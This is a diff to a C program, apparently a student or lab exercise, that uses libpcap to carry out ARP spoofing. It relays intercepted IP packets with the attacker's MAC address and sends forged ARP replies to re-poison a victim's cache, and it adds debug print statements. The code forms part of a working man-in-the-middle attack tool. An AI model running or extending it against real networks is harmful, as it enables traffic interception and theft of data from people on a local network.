@@ -50,7 +50,7 @@ Session find_session(const Eth_header* eth, vector<Session> s, map<uint32_t, MAC
 	
 }
 
-void relay(const char * dev, const IP_header *ip, Session s, map<uint32_t, MAC> m){
+void relay(const char * dev, const IP_header *ip, MAC my_mac, Session s, map<uint32_t, MAC> m){
 	
 	u_char *packet;
 	uint16_t iplen = ntohs(ip->total_len);
@@ -58,7 +58,7 @@ void relay(const char * dev, const IP_header *ip, Session s, map<uint32_t, MAC> 
 	packet = (u_char*)malloc(packet_len);
 
 	Eth_header eth;
-	eth.src_mac = m[s.sender_ip];
+	eth.src_mac = my_mac;
 	eth.dst_mac = m[s.target_ip];
 	eth.ether_type = htons(ETHERTYPE_IP);
 
@@ -69,6 +69,7 @@ void relay(const char * dev, const IP_header *ip, Session s, map<uint32_t, MAC> 
 	char errbuf[PCAP_ERRBUF_SIZE];
 	pcap_t *fp;
 	fp = pcap_open_live(dev, 65536, 0, 1000, errbuf);
+	//print_packet("relay", packet, packet_len);
 	int e=pcap_sendpacket(fp, packet, packet_len);
 
 	free(packet);
@@ -138,6 +139,7 @@ int main(int argc, char* argv[]) {
 		struct pcap_pkthdr* header;
 	    const u_char* packet;
 	    int res = pcap_next_ex(handle, &header, &packet);
+
 	    if (res == 0) continue;
 	    if (res == -1 || res == -2) break;
 
@@ -148,10 +150,13 @@ int main(int argc, char* argv[]) {
 		Session cur_session = find_session(eth_pkt, session_array, m);
 
 		if(ntohs(eth_pkt->ether_type) == ETHERTYPE_IP){
+			printf("before relay\n");
 			const IP_header *ip_pkt = (IP_header *)((u_char*)eth_pkt + 0xE);
-			relay(dev, ip_pkt, cur_session, m);
+			relay(dev, ip_pkt, my_mac, cur_session, m);
+			printf("after relay\n");
 		}
 		else if(ntohs(eth_pkt->ether_type) == ETHERTYPE_ARP){
+			printf("before re-infection\n");
 			const ARP_header *arp_pkt = (ARP_header *)((u_char*)eth_pkt + 0xE);
 			// sender's arp request (before arp table expired)
 			if(!(ntohs(arp_pkt->opcode) == ARPOP_REQUEST && ntohs(arp_pkt->target_addr) == my_ip)) continue;
@@ -159,6 +164,7 @@ int main(int argc, char* argv[]) {
 			if(!(!memcmp(&(arp_pkt->sender_mac), &(m[cur_session.sender_ip]), 6) && ntohs(arp_pkt->sender_addr) == cur_session.target_ip)) continue;
 
 			send_arp(dev, my_mac, cur_session.target_ip, m[cur_session.sender_ip], cur_session.sender_ip, ARPOP_REPLY);
+			printf("after infection\n");
 		}
 	}
 
